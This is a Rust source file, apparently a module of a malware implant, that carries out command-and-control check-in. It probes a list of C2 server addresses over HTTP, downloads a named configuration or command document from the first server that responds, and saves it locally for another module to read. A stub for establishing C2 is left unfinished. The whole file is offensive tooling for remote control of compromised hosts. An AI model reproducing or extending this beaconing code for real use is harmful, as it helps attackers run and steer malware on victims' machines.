use std::{
    fs::File,
    io::{Read, Write},
};

// Command and Control logic
use log::{error, info};

// IPv4
type Addr = String;
type Docname = String;

pub fn get_commands(c2: Vec<Addr>, docname: Docname) {
    if c2.is_empty() {
        error!("no c2 server specified")
    }
    // no else needed, this loop has nothing to iterate over
    for addr in c2 {
        // once we find a valid c2 server, stop looking
        match try_callout(&addr) {
            Ok(_) => {
                update_conf(&addr, docname);
                break;
            }
            Err(e) => error!("{e}"),
        }
    }

    crate::borrow::recent_config();
}

fn try_file_write(docname: String, body: &str) {
    info!("saving response to {docname}");
    if let Ok(mut file) = File::create(&docname) {
        match file.write_all(body.as_bytes()) {
            Ok(_) => info!("succesfully saved to {docname}"),
            Err(e) => error!("file write error: {e}"),
        };
    } else {
        error!("could not save response to {docname}");
    }
}

fn update_conf(addr: &Addr, docname: Docname) -> () {
    info!("querying {:?}", addr);
    let mut dst: String = addr.clone();
    dst.push_str("/");
    dst.push_str(&docname);

    if let Ok(response) = reqwest::blocking::get(&dst) {
        if let Ok(body) = response.text() {
            try_file_write(docname, &body);
            try_file_write(String::from("./recent.json"), &body);
        } else {
            error!("could not read response from {dst}");
        }
    } else {
        error!("no response from c2 at {dst}");
    }
}

fn try_callout(addr: &Addr) -> Result<(), String> {
    info!("checking {addr}");
    if let Ok(response) = reqwest::blocking::get(addr) {
        if let Ok(body) = response.text() {
            info!("response: {body:?}");
            Ok(())
        } else {
            Err(format!("Could not read response body"))
        }
    } else {
        Err(format!("No response from c2 at {addr}"))
    }
}

pub fn establish_c2() -> () {
    todo!("establish c2")
}
